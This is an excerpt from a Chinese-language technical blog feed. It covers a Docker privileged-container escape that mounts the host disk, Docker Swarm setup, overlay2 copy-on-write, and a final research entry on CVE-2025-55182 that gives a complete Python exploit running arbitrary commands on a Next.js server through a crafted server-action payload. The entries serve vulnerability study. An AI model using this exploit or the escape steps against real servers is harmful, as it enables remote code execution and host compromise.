[{&amp;quot;Id&amp;quot;:&amp;quot;a9c0fe2d7af9aaf0a2154643c5155ad4eae5254d295528dab4cfde2b42fcf6fa&amp;quot;,&amp;quot;Names&amp;quot;:[&amp;quot;/elated_leakey&amp;quot;],&amp;quot;Image&amp;quot;:&amp;quot;my-curl&amp;quot;,&amp;quot;ImageID&amp;quot;:&amp;quot;sha256:77db03e61147c124f23eda7c588cbd21959fc4645462821877028c8b5236faec&amp;quot;,&amp;quot;Command&amp;quot;:&amp;quot;/entrypoint.sh sh -c &#39;while :; do sleep 10; done&#39;&amp;quot;,&amp;quot;Created&amp;quot;:1718034
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;container&quot; tabindex=&quot;-1&quot;&gt;進入建立的特權 container&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;$ docker ps
CONTAINER ID   IMAGE     COMMAND                  CREATED         STATUS         PORTS     NAMES
a9c0fe2d7af9   my-curl   &amp;quot;/entrypoint.sh sh -…&amp;quot;   3 minutes ago   Up 3 minutes             elated_leakey

$ docker exec -it a9c0fe2d7af9 sh
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;device&quot; tabindex=&quot;-1&quot;&gt;可以看到宿主機的 device&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;/dev # ls
autofs           hvc3             loop6            nbd3             ram1             ram9             tty14            tty27            tty4             tty52            tty8             vda
btrfs-control    hvc4             loop7            nbd4             ram10            random           tty15            tty28            tty40            tty53            tty9             vda1
bus              hvc5             mapper           nbd5             ram11            rtc0             tty16            tty29            tty41            tty54            ttyS0            vdb
cachefiles       hvc6             mem              nbd6             ram12            shm              tty17            tty3             tty42            tty55            ttyS1            vdc
core             hvc7             mqueue           nbd7             ram13            stderr           tty18            tty30            tty43            tty56            ttyS2            vga_arbiter
cpu_dma_latency  hwrng            nbd0             nbd8             ram14            stdin            tty19            tty31            tty44            tty57            ttyS3            vhost-net
cuse             kmsg             nbd1             nbd9             ram15            stdout           tty2             tty32            tty45            tty58            uinput           vhost-vsock
fd               loop-control     nbd10            net              ram2             tty              tty20            tty33            tty46            tty59            urandom          vport2p0
full             loop0            nbd11            null             ram3             tty0             tty21            tty34            tty47            tty6             vcs              vsock
fuse             loop1            nbd12            port             ram4             tty1             tty22            tty35            tty48            tty60            vcs1             zero
gpiochip0        loop2            nbd13            ppp              ram5             tty10            tty23            tty36            tty49            tty61            vcsa
hvc0             loop3            nbd14            ptmx             ram6             tty11            tty24            tty37            tty5             tty62            vcsa1
hvc1             loop4            nbd15            pts              ram7             tty12            tty25            tty38            tty50            tty63            vcsu
hvc2             loop5            nbd2             ram0             ram8             tty13            tty26            tty39            tty51            tty7             vcsu1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;修改 host 文件&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ mount dev/vda1 /home/vda1
/dev # ls /home/vda1
cni                 desktop-containerd  kubeadm             lost+found          mutagen             swap
containerd          docker              kubelet-plugins     machine-id          nfs                 wasm
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/Docker/docker 特權逃逸/" >
        </entry>
        <entry>
            <title>
                Docker swarm 研究
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/Docker/Docker swarm 研究/</id>
            <content type="html">
                &lt;p&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#docker&quot;&gt;#docker&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#docker-swarm&quot;&gt;#docker-swarm&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;docker-swarm-cluser&quot; tabindex=&quot;-1&quot;&gt;啟動 docker swarm cluser&lt;/h2&gt;
&lt;p&gt;建立 swarm manager&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ docker swarm init
Swarm initialized: current node (vft2r90bfk02ybdxwbmomr36w) is now a manager.

To add a worker to this swarm, run the following command:

    docker swarm join --token SWMTKN-1-10fb01trc9pmy5ullxpsbroxx2mb340xe9oxea47ggdg7xdzni-7jk0smc4a66r450xlsd7isu9j 10.92.0.153:2377

To add a manager to this swarm, run &#39;docker swarm join-token manager&#39; and follow the instructions.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;根據顯示的指令，將另一個 node 加入到 swarm cluster&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ ssh a9-test-2
$ docker swarm join --token SWMTKN-1-10fb01trc9pmy5ullxpsbroxx2mb340xe9oxea47ggdg7xdzni-7jk0smc4a66r450xlsd7isu9j 10.92.0.153:2377
This node joined a swarm as a worker.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看目前 cluster 的加入指令&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ docker swarm join-token manager
To add a manager to this swarm, run the following command:

    docker swarm join --token SWMTKN-1-10fb01trc9pmy5ullxpsbroxx2mb340xe9oxea47ggdg7xdzni-3s6hu2uirlu58ixe6nlakrr49 10.92.0.153:2377
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;管理目前集群的 node&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ docker node ls
ID                            HOSTNAME   STATUS    AVAILABILITY   MANAGER STATUS   ENGINE VERSION
vft2r90bfk02ybdxwbmomr36w *   jason-1    Ready     Active         Leader           27.3.1
x40thj73emfiyvi1371etqir4     jason-2    Ready     Active                          27.3.1
&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;
&lt;h2 id=&quot;docker-swarm-service&quot; tabindex=&quot;-1&quot;&gt;在 docker swarm 上建立一個 service&lt;/h2&gt;
&lt;p&gt;建立一個 nginx 在 swarm 上成為一個 service&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ docker service create --name my_web nginx
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;驗證狀態&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ docker service ls
ID             NAME                MODE         REPLICAS   IMAGE          PORTS
y5rdvf9k7tef   vigorous_margulis   replicated   1/1        nginx:latest
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;建立 replicas 2 的一個服務&lt;br /&gt;
這兩個 replica 會在這個 cluster 的兩個 node 上運行，並且將  8080 公開到 node port 上&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-console&quot;&gt;docker service create --name my_web &#92;
                        --replicas 2 &#92;
                        --publish published=8080,target=80 &#92;
                        nginx
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;訪問任一台 node 的 8080 port 都可以得到 response&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ curl 10.92.0.154:8080
&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;
&lt;h2 id=&quot;docker-swarm-daemon-set&quot; tabindex=&quot;-1&quot;&gt;docker swarm 建立一個  DaemonSet&lt;/h2&gt;
&lt;p&gt;如果將 mode 設定為 global，就會在每個 node 上面建一個 container(類似 k8s &lt;a href=&quot;https://kubernetes.io/docs/concepts/workloads/controllers/daemonset/&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;daemonset&lt;/a&gt;)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ docker service create &#92;
  --mode global &#92;
  --publish mode=host,target=80,published=8080 &#92;
  --name=nginx &#92;
  nginx:latest
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;$ docker service ls
ID             NAME      MODE      REPLICAS   IMAGE          PORTS
wlxtyx45w4qx   nginx     global    2/2        nginx:latest
&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;
&lt;h2 id=&quot;stack-docker-swarm&quot; tabindex=&quot;-1&quot;&gt;以 stack 形式啟動 docker swarm&lt;/h2&gt;
&lt;p&gt;支援 docker compose 格式的設定檔&lt;/p&gt;
&lt;p&gt;docker-compose.yml&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; services:
    web:
      image: nginx
      ports:
        - &amp;quot;8000:80&amp;quot;
      deploy:
        mode: global  &amp;lt;--- 變成 daemonset 形式，每個 node 都會有一個 container
    redis:
      image: redis:alpine
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;建立一個基於 docker compose 的 stack 部署&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ docker stack deploy --compose-file docker-compose.yml stackdemo
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;檢查是否正在運行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ docker stack services stackdemo
ID             NAME              MODE         REPLICAS   IMAGE          PORTS
qyy4hxvdng72   stackdemo_redis   replicated   1/1        redis:alpine
y1b5uyxewmqn   stackdemo_web     replicated   1/1        nginx:latest   *:8000-&amp;gt;80/tcp
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;log&quot; tabindex=&quot;-1&quot;&gt;Log 系統&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;$ docker service logs stackdemo_web -f
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/Docker/Docker swarm 研究/" >
        </entry>
        <entry>
            <title>
                Docker overlay2 儲存結構研究
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/Docker/Docker overlay2 儲存結構研究/</id>
            <content type="html">
                &lt;p&gt;&lt;code&gt;docker info&lt;/code&gt; 查看storage driver&lt;/p&gt;
&lt;p&gt;首先拉取一個Nginx鏡像，然後通過命令&lt;code&gt;docker image inspect nginx&lt;/code&gt;查看Nginx鏡像的詳情，每個鏡像都會有一個Data資訊，這個資訊指示了鏡像是怎麼存的。&lt;br /&gt;
查看 image 的詳情&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250219093919.png&quot; alt=&quot;Pasted image 20250219093919.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250219093927.png&quot; alt=&quot;Pasted image 20250219093927.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;其中 MergedDir 代表當前鏡像層在 overlay2 儲存下的目錄，LowerDir 代表當前鏡像的父層關係，使用冒號分隔，冒號最後代表該鏡像的最底層。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;接著我們進入到任意一個鏡像層看看裡面的結構&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250219094120.png&quot; alt=&quot;Pasted image 20250219094120.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250219094158.png&quot; alt=&quot;Pasted image 20250219094158.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;**鏡像層的&lt;code&gt;link&lt;/code&gt;文件內容為該鏡像層的`短ID&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ cat link | xargs echo
DWWRLQXD5ZZYZFLAECXOWA7ODL
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;lower&lt;/code&gt;檔內容為該層的所有父層鏡像的&lt;code&gt;短ID&lt;/code&gt;。會用冒號 : 分隔&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ cat lower | xargs echo
l/XDQAR5Z4MSK7WNLYDBINB26DK4:l/VPWWG52KMQWNK7K3IMSTON3SRJ:l/UQPY6GNRH4CX3GA66Q75NCAXWN:l/PFGRT5RL3UYLRSI7GXQEOXVLHL:l/IWUVFE4FQR2BE5W5YZIKOYTJWG:l/KEISEPOCFYKYXTNIQQRWTWXGZF:l/JHJ27BDVU264GX5GY2ZHZXINEG:l/HVZVYP2P3H35EVYVSPQRHK6LFQ:l/OGZYCU6IXTZROMPIVINKLUWFJS:l/4FM6QTF6W57G4JUF4S4TSC663T:l/2TRWFLEP26VVMIB2XESNCDKT5R:l/JZ6W4BFQA5LVJOYM5YYX5OHQDU:l/Z4BVWLONYV352YARKDBI4NRZGE:l/N3RDTIUUIJZRVSOAJ6XNSF6YTB:l/G3KDMCGSVUKLBPXEWVYZMPAF4L:l/3TOZSAK6KLMVF3QLT4UIMSBRPB:l/STV7FCMXVMMGPSKOFCZIA7EBOV:l/Y5FZNDARXRLXRZCDNQVL3FFEGB:l/FOI4PWVIXLO6WN7QAUJJMTFJXL
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;這時候我們再回過頭來看看上面中冒號最後的鏡像層，也就是我們Nginx鏡像父層的最底層是什麼樣的&lt;code&gt;LowerDir&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-json&quot;&gt;  &amp;quot;GraphDriver&amp;quot;: {                                                                                                                       
            &amp;quot;Data&amp;quot;: {                                                                                                                          
                &amp;quot;LowerDir&amp;quot;: &amp;quot;/var/lib/docker/overlay2/8dde6c69291ee08772fae49713a1ad2a715f5f53195e02ad921d595735316407/diff:/var/lib/docker/overlay2/f707d5dc454841a838102dbd1d702e9c7db107d8d13c25a6c4228daecb42407d/diff:/var/lib/docker/overlay2/0b39f39a877587cad676d3d2c0d078d26a058f51488a34b7918e7d3fe15b9fa6/diff:/var/lib/docker/overlay2/c25343bca009cf414ef51ec190ce5617b663cb601438eff5b03e818b648be94b/diff:/var/lib/docker/overlay2/5d925f8d2a4bc99e52980e08f3aeb08908a565e54f74023544d5a6952562e1b0/diff:/var/lib/docker/overlay2/47b9dc8bbd4059cb7689a3844f1316dc9f258c4f2d54fd3c2263411fac17a6e5/diff&amp;quot;,                                  
                &amp;quot;MergedDir&amp;quot;: &amp;quot;/var/lib/docker/overlay2/da9400108f56bc797caeb9ddfe6b33e71de9cd09355b8d141596ae7606f7a406/merged&amp;quot;,               
                &amp;quot;UpperDir&amp;quot;: &amp;quot;/var/lib/docker/overlay2/da9400108f56bc797caeb9ddfe6b33e71de9cd09355b8d141596ae7606f7a406/diff&amp;quot;,                  
                &amp;quot;WorkDir&amp;quot;: &amp;quot;/var/lib/docker/overlay2/da9400108f56bc797caeb9ddfe6b33e71de9cd09355b8d141596ae7606f7a406/work&amp;quot;                    
            },                                                                                                                                 
            &amp;quot;Name&amp;quot;: &amp;quot;overlay2&amp;quot;                                                                                                                 
        },
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看到它裡面沒有了檔，這是因為他就是最底層了，等於是根鏡像了。 同時，資料夾下的檔，就是我們熟悉的Linux文件目錄結構&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@jason-1:/var/lib/docker/overlay2/47b9dc8bbd4059cb7689a3844f1316dc9f258c4f2d54fd3c2263411fac17a6e5/diff# ll
total 68
drwxr-xr-x 17 root root 4096 Nov 25 14:44 ./
drwx--x---  3 root root 4096 Nov 25 14:44 ../
lrwxrwxrwx  1 root root    7 Nov 11 08:00 bin -&amp;gt; usr/bin/
drwxr-xr-x  2 root root 4096 Oct 31 19:04 boot/
drwxr-xr-x  2 root root 4096 Nov 11 08:00 dev/
drwxr-xr-x 29 root root 4096 Nov 11 08:00 etc/
drwxr-xr-x  2 root root 4096 Oct 31 19:04 home/
lrwxrwxrwx  1 root root    7 Nov 11 08:00 lib -&amp;gt; usr/lib/
lrwxrwxrwx  1 root root    9 Nov 11 08:00 lib64 -&amp;gt; usr/lib64/
drwxr-xr-x  2 root root 4096 Nov 11 08:00 media/
drwxr-xr-x  2 root root 4096 Nov 11 08:00 mnt/
drwxr-xr-x  2 root root 4096 Nov 11 08:00 opt/
drwxr-xr-x  2 root root 4096 Oct 31 19:04 proc/
drwx------  2 root root 4096 Nov 11 08:00 root/
drwxr-xr-x  3 root root 4096 Nov 11 08:00 run/
lrwxrwxrwx  1 root root    8 Nov 11 08:00 sbin -&amp;gt; usr/sbin/
drwxr-xr-x  2 root root 4096 Nov 11 08:00 srv/
drwxr-xr-x  2 root root 4096 Oct 31 19:04 sys/
drwxrwxrwt  2 root root 4096 Nov 11 08:00 tmp/
drwxr-xr-x 12 root root 4096 Nov 11 08:00 usr/
drwxr-xr-x 11 root root 4096 Nov 11 08:00 var/
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;容器怎麼存儲&quot; tabindex=&quot;-1&quot;&gt;容器怎麼存儲&lt;/h2&gt;
&lt;p&gt;啟動一個Nginx容器，以便觀察Docker創建的容器可寫層，並查看它的配置資訊&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ docker run --name=nginx -d -v /tmp/test.txt:/tmp/test.txt nginx
$ docker inspect nginx
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;進入容器層目錄，看看裡面的結構&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250219100023.png&quot; alt=&quot;Pasted image 20250219100023.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250219100102.png&quot; alt=&quot;Pasted image 20250219100102.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;進入容器內部&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ docker exec -it nginx bash
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在容器內部建一個檔案，輸入&lt;code&gt;ls -i&lt;/code&gt;，會輸出 inode id 為 677855&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250219102651.png&quot; alt=&quot;Pasted image 20250219102651.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;在宿主機的 diff 層也可以看到該檔案的 inode 為 677855&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250219102626.png&quot; alt=&quot;Pasted image 20250219102626.png&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;容器與鏡像的寫時複製技術&quot; tabindex=&quot;-1&quot;&gt;容器與鏡像的寫時複製技術&lt;/h4&gt;
&lt;p&gt;前面我們說到了，一個鏡像的多個容器用到的文件系統就是鏡像的文件系統&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250219103549.png&quot; alt=&quot;Pasted image 20250219103549.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;為了保證容器的修改不會互相影響，Docker採用了寫時複製技術。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Copy-on-Write特性：&lt;br /&gt;
當容器啟動時，一個新的可寫層被載入到鏡像的頂部。 這一層被稱之為「容器層」，容器層之下的都叫做「鏡像層」。&lt;br /&gt;
所有對容器的改動，無論添加、刪除，還是修改檔都只會發生在容器層中。 只有容器層是可以寫的，容器層下面的所有鏡像層都是只讀的。&lt;br /&gt;
我們在容器中進行操作時：&lt;br /&gt;
- 添加檔: 在容器中創建檔時，新檔被添加到容器層中。&lt;br /&gt;
- 讀取檔: 在容器中讀取某個檔時，Docker會從上往下依次在各鏡像層中查找此檔。 一旦找到，打開並讀入記憶體。&lt;br /&gt;
- 修改檔: 在容器中修改已存在的檔時，Docker會從上往下依次在各鏡像層中查找此檔。 一旦找到，立即將其複製到容器層，然後修改。&lt;br /&gt;
- 刪除檔案: 在容器中刪除檔時，Docker也是從上往下依次在各鏡像層中查找此檔。 找到后，會在容器層中記錄下此刪除操作。&lt;br /&gt;
只有當需要修改時才複製一份數據，這種特性被稱作Copy-on-Write。 可見，容器層保存的鏡像變化的部分，不會對鏡像本身進行任何修改。&lt;br /&gt;
寫時複製不僅節省空間，而且還減少了容器啟動時間。 當你創建一個容器（或者來自同一個鏡像的多個容器）時，Docker 只需要創建可寫容器層即可。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;strong-strong&quot; tabindex=&quot;-1&quot;&gt;&lt;strong&gt;驗證寫時複製技術的過程&lt;/strong&gt;&lt;/h3&gt;
&lt;hr /&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ docker inspect nginx | jq &#39;.[0].GraphDriver.Data.LowerDir&#39; | awk -F: &#39;{for (i=1; i&amp;lt;=NF; i++) print &amp;quot;Layer &amp;quot; i &amp;quot;: &amp;quot; $i}&#39;| sed &#39;s/&amp;quot;//g&#39;
Layer 1: /var/lib/docker/overlay2/04ad8e4...3b037397e8bdbc5-init/diff
Layer 2: /var/lib/docker/overlay2/da9400108f56...406/diff
Layer 3: /var/lib/docker/overlay2/8dde6c6929...6407/diff
Layer 4: /var/lib/docker/overlay2/f707d5dc454841a8381...407d/diff
Layer 5: /var/lib/docker/overlay2/0b39f39a877587c...9fa6/diff
Layer 6: /var/lib/docker/overlay2/c25343bca0...94b/diff
Layer 7: /var/lib/docker/overlay2/5d9...544d5a6952562e1b0/diff
Layer 8: /var/lib/docker/overlay2/47b9dc1f...ac17a6e5/diff &amp;lt;-- 最後一層為容器層
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250219105615.png&quot; alt=&quot;Pasted image 20250219105615.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;再將合併結果寫成跟 Layer 1 去掉 &lt;code&gt;-init&lt;/code&gt; 的同樣的目錄名稱作為工作目錄&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250219105638.png&quot; alt=&quot;Pasted image 20250219105638.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250219105831.png&quot; alt=&quot;Pasted image 20250219105831.png&quot; /&gt;&lt;/p&gt;
&lt;h3 id=&quot;測試在容器內部修改鏡像層已存在的檔案&quot; tabindex=&quot;-1&quot;&gt;測試在容器內部修改鏡像層已存在的檔案&lt;/h3&gt;
&lt;hr /&gt;
&lt;h3 id=&quot;before&quot; tabindex=&quot;-1&quot;&gt;Before&lt;/h3&gt;
&lt;p&gt;鏡像層&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ find $(docker inspect nginx | jq -r &#39;.[0].GraphDriver.Data.LowerDir&#39; | tr &#39;:&#39; &#39; &#39;) -type f -name &amp;quot;nginx.conf&amp;quot; | xargs ls -i

1882130 /var/snap/docker/common/var-lib-docker/overlay2/227a9d016be667d656c65c1c5440071d45faeb83db145c5482ef812b6c47979f/diff/etc/nginx/nginx.conf
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;容器內&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@592347294aa1:/etc/nginx# ls -i | grep nginx

1882130 nginx.conf
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;$ UPPER_DIR=$(docker inspect nginx | jq -r &#39;.[0].GraphDriver.Data.UpperDir&#39;)
$ find &amp;quot;$UPPER_DIR&amp;quot; -type f -name &amp;quot;nginx.conf&amp;quot;
&amp;lt;在 Upper dir 內找不到 nginx.conf檔案，因為現在該檔案在鏡像層只讀&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;after&quot; tabindex=&quot;-1&quot;&gt;After&lt;/h2&gt;
&lt;p&gt;在 container 內修改檔案&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@eae0f9d12762:/etc/nginx# echo 123 &amp;gt;&amp;gt; nginx.conf
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;原始 inode 未改變&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@592347294aa1:/etc/nginx# ls -i | grep nginx

1882130 nginx.conf
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;從宿主機上看在 upper dir 內的 inode 已改變，代表 docker「寫時複製功能」生效，當檔案在鏡像層被修改時，會複製一份到讀寫層&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ UPPER_DIR=$(docker inspect nginx | jq -r &#39;.[0].GraphDriver.Data.UpperDir&#39;)
$ find &amp;quot;$UPPER_DIR&amp;quot; -type f -name &amp;quot;nginx.conf&amp;quot; | xargs ls -i

1884494 /var/snap/docker/common/var-lib-docker/overlay2/649e271405128d7d52d1b53ea1fef0c7589c191529afe0f89be89ef28778efcf/diff/etc/nginx/nginx.conf
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;root@jason-1:/# tail -10 /var/snap/docker/common/var-lib-docker/overlay2/3434bfba1c899d2d7f5bdf407e284410561dc3c5e5b88143072739bbc33e791c/diff/etc/nginx/nginx.conf
    sendfile        on;
    &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#tcp_nopush&quot;&gt;#tcp_nopush&lt;/a&gt;     on;

    keepalive_timeout  65;

    &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#gzip&quot;&gt;#gzip&lt;/a&gt;  on;

    include /etc/nginx/conf.d/*.conf;
}
123 &amp;lt;-- 被修改
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;原本處於鏡像層的檔案還是沒改變&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# find $(docker inspect nginx | jq -r &#39;.[0].GraphDriver.Data.LowerDir&#39; | tr &#39;:&#39; &#39; &#39;) -type f -name &amp;quot;nginx.conf&amp;quot; | xargs ls -i

1882130 /var/snap/docker/common/var-lib-docker/overlay2/227a9d016be667d656c65c1c5440071d45faeb83db145c5482ef812b6c47979f/diff/etc/nginx/nginx.conf
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;root@jason-1:/# tail -10 /var/snap/docker/common/var-lib-docker/overlay2/227a9d016be667d656c65c1c5440071d45faeb83db145c5482ef812b6c47979f/diff
/etc/nginx/nginx.conf

    sendfile        on;
    &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#tcp_nopush&quot;&gt;#tcp_nopush&lt;/a&gt;     on;

    keepalive_timeout  65;

    &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#gzip&quot;&gt;#gzip&lt;/a&gt;  on;

    include /etc/nginx/conf.d/*.conf;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;原因:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在容器內部修改檔案時，&lt;strong&gt;inode 不會更新&lt;/strong&gt;，因為 OverlayFS 只是在上層可寫層中覆蓋檔案內容，而不會對原始鏡像層中的檔案結構進行修改。只有當檔案被刪除或完全替換時，inode 才會更新。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;$ MERGED_DIR=$(docker inspect nginx | jq -r &#39;.[0].GraphDriver.Data.MergedDir&#39;)
$ find &amp;quot;$MERGED_DIR&amp;quot; -type f -name &amp;quot;nginx.conf&amp;quot; | xargs ls -i
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;結論 :&lt;br /&gt;
vim 會在修改檔案時，預設會刪除並覆蓋，所以會改變 inode id，當在 container 內改檔案時， inode id 改變造成 overlay2 無法同步跟外部這份檔案&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/Docker/Docker overlay2 儲存結構研究/" >
        </entry>
        <entry>
            <title>
                CVE-2025-55182 漏洞研究
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/CVE-2025-55182 漏洞研究/</id>
            <content type="html">
                &lt;pre&gt;&lt;code&gt;npm create next-app@16.0.6
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;cd my-app/
npm run dev
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;打開 &lt;code&gt;http://localhost:3000&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;攻擊程式&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# refrence: https://github.com/msanft/CVE-2025-55182

import requests
import sys
import json

BASE_URL = sys.argv[1] if len(sys.argv) &amp;gt; 1 else &amp;quot;http://localhost:3000&amp;quot;
EXECUTABLE = sys.argv[2] if len(sys.argv) &amp;gt; 2 else &amp;quot;id&amp;quot;

crafted_chunk = {
    &amp;quot;then&amp;quot;: &amp;quot;$1:__proto__:then&amp;quot;,
    &amp;quot;status&amp;quot;: &amp;quot;resolved_model&amp;quot;,
    &amp;quot;reason&amp;quot;: -1,
    &amp;quot;value&amp;quot;: &#39;{&amp;quot;then&amp;quot;: &amp;quot;$B0&amp;quot;}&#39;,
    &amp;quot;_response&amp;quot;: {
        &amp;quot;_prefix&amp;quot;: f&amp;quot;var res = process.mainModule.require(&#39;child_process&#39;).execSync(&#39;{EXECUTABLE}&#39;,{{&#39;timeout&#39;:5000}}).toString().trim(); throw Object.assign(new Error(&#39;NEXT_REDIRECT&#39;), {{digest:`${{res}}`}});&amp;quot;,
        # If you don&#39;t need the command output, you can use this line instead:
        # &amp;quot;_prefix&amp;quot;: f&amp;quot;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;{EXECUTABLE}&#39;);&amp;quot;,
        &amp;quot;_formData&amp;quot;: {
            &amp;quot;get&amp;quot;: &amp;quot;$1:constructor:constructor&amp;quot;,
        },
    },
}

files = {
    &amp;quot;0&amp;quot;: (None, json.dumps(crafted_chunk)),
    &amp;quot;1&amp;quot;: (None, &#39;&amp;quot;$@0&amp;quot;&#39;),
}

headers = {&amp;quot;Next-Action&amp;quot;: &amp;quot;x&amp;quot;}
res = requests.post(BASE_URL, files=files, headers=headers, timeout=10)
print(res.status_code)
print(res.text)
&lt;/code&gt;&lt;/pre&gt;

            </content>
